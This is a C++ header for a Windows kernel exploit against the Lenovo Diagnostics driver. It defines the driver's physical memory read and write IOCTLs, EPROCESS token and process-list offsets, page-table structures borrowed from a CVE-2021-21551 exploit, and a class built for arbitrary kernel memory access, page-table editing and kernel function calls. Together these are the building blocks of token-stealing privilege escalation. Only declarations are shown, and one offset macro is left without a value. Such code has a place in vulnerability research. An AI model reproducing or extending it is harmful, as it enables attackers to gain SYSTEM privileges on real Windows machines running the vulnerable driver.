#pragma once

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string>

#pragma comment(lib, "ntdll")

//#define USE_STATIC_OFFSETS

#define IOCTL_PHYS_RD 0x222010
#define IOCTL_PHYS_WR 0x222014

#define SYS_INFO_CLASS_MODULE_INFO 0x0b
#define OFFSET_PS_INITIAL_SYSTEM_PROC 0x00cfb420
#define EPROCESS_TOKEN_OFFSET 0x358
#define EPROCESS_ACTIVE_LINKS_OFFSET 
#define EPROCESS_DIRBASE_OFFSET 0x028

struct CALL_DATA
{
	UINT64 FunctionAddr;
	UINT64 Arg1;
	UINT64 Arg2;
	UINT64 Arg3;
	UINT64 Arg4;
	UINT64 CallResult0;
};

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct LDIAG_READ {
	DWORD64 data;
	DWORD64 wLen;
} LDIAG_READ, * PLDIAG_READ;

typedef struct LDIAG_WRITE {
	DWORD64 _where;
	DWORD dwMapSize;
	DWORD dwLo;
	DWORD64 _what_ptr;
} LDIAG_WRITE, * PLDIAG_WRITE;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h
typedef struct _FILL_PTE_HIERARCHY
{
	UINT64 PXE = 0;
	UINT64 PPE = 0;
	UINT64 PDE = 0;
	UINT64 PTE = 0;
} FILL_PTE_HIERARCHY, * PFILL_PTE_HIERARCHY;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h#L54
typedef union _PAGE_TABLE_ENTRY
{
	struct
	{
		UINT64 Present : 1;					/// bit 0
		UINT64 ReadWrite : 1;				/// bit 1
		UINT64 UserSupervisor : 1;			/// bit 2
		UINT64 PageLevelWriteThrough : 1;	/// bit 3
		UINT64 PageLevelCacheDisable : 1;	/// bit 4
		UINT64 Accessed : 1;				/// bit 5
		UINT64 Dirty : 1;					/// bit 6
		UINT64 PAT : 1;						/// bit 7
		UINT64 Global : 1;					/// bit 8 
		UINT64 CopyOnWrite : 1;				/// bit 9
		UINT64 Ignored : 2;					/// bits 10 - 11
		UINT64 Pfn : 40;					/// bits 12 - (52 - 1)
		UINT64 Reserved : 11;				/// bits 52 - 62
		UINT64 NxE : 1;						/// bit 63
	} flags;
	UINT64 value = 0;
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

enum PageType 
{
	UsePte,
	UsePde
};

#ifdef USE_STATIC_OFFSETS

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_PID 0x440
#define OFFSET_EPROCESS_THREAD_HEAD_LIST 0x5E0

#define OFFSET_ETHREAD_ID 0x480
#define OFFSET_ETHREAD_PREVIOUS_MODE 0x232
#define OFFSET_ETHREAD_LIST_ENTRY 0x4E8

#define OFFSET_MI_GET_PTE_ADDRESS 0x2DDF70
#define OFFSET_MM_ALLOCATE_INDEPENDENT_PAGES 0x755ec0
#define OFFSET_MM_SET_PAGE_PROTECTION 0x3781d0

#endif

class LenovoMemoryMgr
{
public:
	LenovoMemoryMgr() {};
	~LenovoMemoryMgr() {};

	HANDLE hDevice = 0;
	std::string driver_name_str;
	UINT64 physSwapAddr = 0;
	UINT64 tempSwap = 0;
	UINT64 NtosBase = 0;
	UINT64 PteBase = 0;

	ULONG process_active_process_links_offset = 0;
	ULONG process_pid_offset = 0;
	ULONG process_thread_head_list_offset = 0;

	ULONG thread_id_offset = 0;
	ULONG thread_previous_mode_offset = 0;
	ULONG thread_list_entry_offset = 0;

	ULONG mi_get_pte_address_offset = 0;
	ULONG mm_allocate_independent_pages_offset = 0;
	ULONG mm_set_page_protection_offset = 0;

	UINT64 FindBase(const char* image_name);

	UINT64 GetPsInitialSystemProc();
	UINT64 GetKernelExport(const char* function_name);
	BOOL SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess);

	UINT64 GetPreviousModeAddress();
	UINT64 GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry);
	BOOL WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry);
	
	BOOL Init(std::string driver_name);
	BOOL Shutdown();

	const char* strDeviceName = R"(\\.\LenovoDiagnosticsDriver)";

	UINT64 CallKernelFunction(_In_ UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4);
	
	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL ReadPhysData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL WritePhysData(_In_ UINT64 PhysDest, _In_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL ReadVirtData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL WriteVirtData(_In_ UINT64 address, _Out_ T* data);

private:
	PFILL_PTE_HIERARCHY CreatePteHierarchy(UINT64 VirtualAddress);
	UINT64 FindPhysSwapSpace();
	UINT64 GetPteBase();
	UINT64 VtoP(UINT64 va, UINT64 index, PageType p);
	PageType GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry);
	UINT64 FindNtosBase();
};

